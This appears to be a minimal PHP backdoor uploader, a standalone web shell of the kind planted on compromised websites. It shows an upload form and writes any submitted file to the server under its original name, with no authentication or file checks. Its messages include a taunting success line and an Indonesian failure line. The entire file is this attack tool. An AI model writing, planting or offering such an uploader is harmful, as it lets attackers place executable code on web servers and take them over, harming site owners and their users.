<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>HASTALAVISTA BEB<b><br><br>'; }
else { echo '<b>GAGAL BOSKU ! DI COBA LAGI YA BOS KU !</b><br><br>'; }
}
?>
